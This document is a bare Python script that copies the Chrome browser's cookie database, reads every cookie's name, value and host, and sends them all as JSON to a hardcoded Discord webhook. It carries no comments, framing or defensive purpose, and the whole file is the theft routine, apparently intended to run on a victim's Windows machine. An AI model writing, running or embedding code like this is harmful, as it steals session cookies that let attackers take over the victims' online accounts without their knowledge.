import os, sqlite3, shutil, requests

WEBHOOK = "https://discord.com/api/webhooks/1501597067926044736/VZZxbllJi-SrXWpiYFBgGRmDYM1xH-Y-bJC8w03rduLAnk4-f3who1qPSjaWRI_FVHWV"

def get_all_cookies():
    cookies = []
    db = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies")
    if not os.path.exists(db):
        return cookies
    temp = os.environ["TEMP"] + "\\cookies.db"
    shutil.copy2(db, temp)
    conn = sqlite3.connect(temp)
    cur = conn.cursor()
    cur.execute("SELECT name, value, host_key FROM cookies")
    for name, value, host in cur.fetchall():
        cookies.append({"host": host, "name": name, "value": value})
    conn.close()
    os.remove(temp)
    return cookies

if __name__ == "__main__":
    cookies = get_all_cookies()
    if cookies:
        requests.post(WEBHOOK, json={"cookies": cookies})
